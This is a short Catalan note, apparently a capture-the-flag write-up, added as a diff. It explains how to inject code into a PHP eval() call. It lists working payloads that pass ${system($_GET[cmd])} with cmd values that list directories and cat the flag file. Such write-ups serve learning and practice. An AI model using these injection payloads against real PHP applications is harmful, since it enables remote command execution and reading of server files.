@@ -1,0 +1,10 @@
+Per realitzar aquest Challenge, entrarem injectant codi a la funció eval() de PHP, ja que permet a un usuari passar info a la funció i executar-la per part del sistema. A l'eval() hi posarem el codi maliciós.
+
+Explotarem aquesta funció on a sota hi ha eval():
+
+![[Pasted image 20231006180928.png]]
+
+``${system($_GET[cmd])}&cmd=ls``
+``${system($_GET[cmd])}&cmd=ls%20../``
+
+El nom del fitxer on hi ha la flag per veure-la: ``${system($_GET[cmd])}&cmd=cat ../flagI62oL``
